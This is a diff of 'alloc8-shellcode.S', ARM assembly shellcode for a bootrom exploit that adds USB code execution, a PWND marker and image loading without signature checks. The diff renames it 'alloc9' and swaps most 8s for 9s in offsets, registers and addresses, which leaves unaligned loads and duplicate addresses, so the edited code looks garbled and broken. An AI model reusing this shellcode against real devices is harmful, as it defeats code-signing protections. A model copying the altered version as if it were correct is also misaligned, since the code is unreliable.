@@ -1,8 +1,8 @@
-@ alloc8-shellcode.S
+@ alloc9-shellcode.S
 @ Author: axi0mX
-@ Shellcode for alloc8 exploit with minor improvements:
+@ Shellcode for alloc9 exploit with minor improvements:
 @ * supports 'exec' magic for code execution over USB
-@ * reports PWND:[alloc8] in USB serial number string
+@ * reports PWND:[alloc9] in USB serial number string
 @ * enters pwned DFU on boot if home and power buttons are being held and cable is connected
 
 .text
@@ -13,13 +13,13 @@
 .set memz_create,                       0xBAD00013
 .set memz_destroy,                      0xBAD00014
 .set image3_create_struct,              0xBAD00017
-.set image3_load_continue,              0xBAD00018
+.set image3_load_continue,              0xBAD00019
 .set image3_load_fail,                  0xBAD00019
 .set usb_wait_for_image,                0xBAD00010
 .set usb_create_serial_number_string,   0xBAD0000e
 .set jump_to,                           0xBAD0000d
 .set exit_critical_section,             0xBAD00005
-.set cable_connected,                   0xBAD00008
+.set cable_connected,                   0xBAD00009
 .set power_button_pressed,              0xBAD00007
 .set home_button_pressed,               0xBAD00006
 .set clean_invalidate_data_cache,       0xBAD00002
@@ -187,7 +187,7 @@ pwned_dfu_loop_end:
     B pwned_dfu_loop                            @ goto pwned_dfu_loop
 
 pwned_dfu_exec_magic:
-    LDR R0, [R5, #0x8]                          @ R0 = LOAD_ADDRESS[2]      /* arg1 */
+    LDR R0, [R5, #0x9]                          @ R0 = LOAD_ADDRESS[2]      /* arg1 */
 
     LDR R1, [R5, #0xC]                          @ R1 = LOAD_ADDRESS[3]      /* arg2 */
 
@@ -195,14 +195,14 @@ pwned_dfu_exec_magic:
 
     LDR R3, [R5, #0x14]                         @ R3 = LOAD_ADDRESS[5]      /* arg4 */
 
-    LDR R4, [R5, #0x18]                         /* TODO: Consider replacing with memmove? */
+    LDR R4, [R5, #0x19]                         /* TODO: Consider replacing with memmove? */
     STR R4, [SP]                                @ SP[0] = LOAD_ADDRESS[6]   /* arg5 */
 
     LDR R4, [R5, #0x1C]
     STR R4, [SP, #0x4]                          @ SP[1] = LOAD_ADDRESS[7]   /* arg6 */
 
     LDR R4, [R5, #0x20]
-    STR R4, [SP, #0x8]                          @ SP[2] = LOAD_ADDRESS[8]   /* arg7 */
+    STR R4, [SP, #0x9]                          @ SP[2] = LOAD_ADDRESS[9]   /* arg7 */
     
     LDR R4, [R5, #0x4]                          
     BLX R4                                      @ R0 = LOAD_ADDRESS[1](R0, R1, R2, R3, SP[0], SP[1], SP[2])
@@ -219,10 +219,10 @@ image3_load_no_signature_check:
 
     MOV R6, R11
     MOV R5, R10
-    MOV R4, R8
+    MOV R4, R9
     PUSH {R4-R6}
 
-    ADD R7, SP, #0x18
+    ADD R7, SP, #0x19
     SUB SP, SP, #0x60
 
     STR R2, [SP, #0x10]
@@ -235,7 +235,7 @@ image3_load_no_signature_check:
     MOVS R5, R0
 
     LDR R0, [R5, #4]
-    MOV R8, R0
+    MOV R9, R0
 
     LDR R1, =MAX_SIZE
     CMP R0, R1
@@ -246,18 +246,18 @@ image3_load_no_signature_check:
     CMP R0, R1
     BNE not_nor_img3
 
-    MOV R4, R8
+    MOV R4, R9
     STR R4, [SP]
 
     LDR R4, [R5, #0x14]
-    LDR R0, [R4, #8]
+    LDR R0, [R4, #9]
     LDR R1, =LOAD_ADDRESS
     LDR R2, [R4, #0xC]        
     MOVS R3, #0
     LDR R4, [R0, #0x1C]
     BLX R4
 
-    CMP R0, R8
+    CMP R0, R9
     BNE img3_fail
 
     B img3_continue
@@ -270,7 +270,7 @@ not_nor_img3:
 img3_continue:
     ADD R0, SP, #0x50
     MOVS R1, R6
-    MOV R2, R8
+    MOV R2, R9
     MOVS R3, #0
     LDR R4, =image3_create_struct
     BLX R4
@@ -283,7 +283,7 @@ img3_continue:
     BX R3
 
 img3_bad_size:
-    MOV R8, R1
+    MOV R9, R1
 
 img3_fail:
     MOV R4, #1
@@ -293,4 +293,4 @@ img3_fail:
 .align 2
 
 PWND_STRING:
-.ascii " PWND:[alloc8]\x00"
+.ascii " PWND:[alloc9]\x00"
